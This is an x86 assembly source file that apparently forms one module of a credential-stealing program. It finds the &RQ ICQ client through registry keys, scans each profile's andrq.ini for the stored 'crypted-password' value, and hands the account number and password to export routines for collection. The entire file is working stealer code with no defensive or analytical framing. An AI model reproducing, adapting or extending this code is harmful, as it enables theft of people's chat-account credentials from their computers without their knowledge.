.data
	@AllocStr	<szRQRegPath2>, 	<"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\&RQ">
	@AllocStr	<szRQRegValue1>,	<"\&RQ.exe">	
	@AllocStr	<szRQRegValue2>,	<"UninstallString">
	@AllocStr	<szRQCryptPass>,	<"crypted-">	
	@AllocStr	<szRQCryptPass2>,	<"password">	
	@AllocStr	<szRQConf>,		<"\andrq.ini">
	@AllocMem	<lpRQCommonBuf>, 	<MAX_PATH+1>	

.code

GetRQPass proc uses esi ebx szUIN: DWORD
	LOCAL	hMap: MappedFile
	
	invoke	MapFile, offset lpRQCommonBuf, addr hMap
	.IF	(eax) && (hMap.dwFileSize > 32)
		mov	esi, hMap.lpMem
		mov	ebx, hMap.dwFileSize
		sub	ebx, 20 
		
	@l:
		invoke	StrCmpN, esi, offset szRQCryptPass, szRQCryptPassLen
		.IF	!eax
			invoke	ExportStr, TYPE_RQ_UIN, 0, szUIN		
			invoke	StrChr, esi, 0dh
			.IF	eax
				sub	eax, esi
				invoke	ExportData, TYPE_RQ_PASS, 0, esi, eax
				jmp	@ret
			.ENDIF
		.ENDIF
		
		inc	esi
		dec	ebx
		jnz	@l
	.ENDIF	
	
@ret:
	invoke	UnmapFile, addr hMap
	ret
GetRQPass endp

GetRQDat proc uses edi
	LOCAL   FindFileData: WIN32_FIND_DATA
	LOCAL   hFind: DWORD
	
	invoke	lstrlen, offset lpRQCommonBuf
	lea	edi, [eax+offset lpRQCommonBuf]
	mov	dword ptr[edi], '*.*'
        
	invoke  FindFirstFile, offset lpRQCommonBuf, addr FindFileData
	mov     hFind, eax
	inc     eax
	jz      @ret	
        
@find_loop:                
        cmp	FindFileData.cFileName[0], '.'
        jz	@level_up_skip
        
        invoke	lstrcpy, edi, addr FindFileData.cFileName
        invoke	lstrcat, offset lpRQCommonBuf, offset szRQConf
        invoke	GetRQPass, addr FindFileData.cFileName 

@level_up_skip:
	invoke  FindNextFile, hFind, addr FindFileData
	test    eax, eax
	jnz	@find_loop

	invoke  FindClose, hFind

@ret:
	ret
GetRQDat endp

GetRQOutput proc uses esi edi
	LOCAL   hkHandle, dwBufSize, KeyIndex: DWORD
	invoke	ExportModule, MODULE_RQ
	invoke	lstrcat, offset szRQCryptPass, offset szRQCryptPass2
	invoke  RegOpenKey, HKEY_CURRENT_USER, offset szMUIPath, addr hkHandle
	test	eax, eax
	jnz	@no_mui
	mov	KeyIndex, 0
@enum:
        mov     dwBufSize, MAX_PATH
        xor	eax, eax
        invoke  RegEnumValue, hkHandle, KeyIndex, offset lpRQCommonBuf, addr dwBufSize, eax, eax, eax, eax      
        test	eax, eax
        jnz	@enum_end
        
        invoke	StrStrI, offset lpRQCommonBuf, offset szRQRegValue1 
        .IF	eax
		mov	byte ptr[eax+1], 0
		invoke	GetRQDat
		invoke	RegCloseKey, hkHandle
		jmp	@ret 
	.ENDIF
	
	inc	KeyIndex
	jmp	@enum
	
@enum_end:	
	invoke	RegCloseKey, hkHandle

@no_mui:
	mov	dwBufSize, MAX_PATH
	invoke	RegReadValue, HKEY_LOCAL_MACHINE, offset szRQRegPath2, offset szRQRegValue2, offset lpRQCommonBuf, addr dwBufSize 
	.IF	eax
		mov	esi, offset lpRQCommonBuf
		invoke	lstrlen, esi
		.IF	byte ptr[esi+eax-1] == '"'
			mov	byte ptr[esi+eax-1], 0
		.ENDIF
		.IF	byte ptr[esi] == '"'
			mov	edi, esi
			inc	esi
			mov	ecx, eax
			rep movsb
		.ENDIF
		mov	esi, offset lpRQCommonBuf
		invoke	lstrlen, esi
		mov	byte ptr[esi+eax-13], 0
		invoke	GetRQDat
	.ENDIF
	
@ret:
	ret
GetRQOutput endp
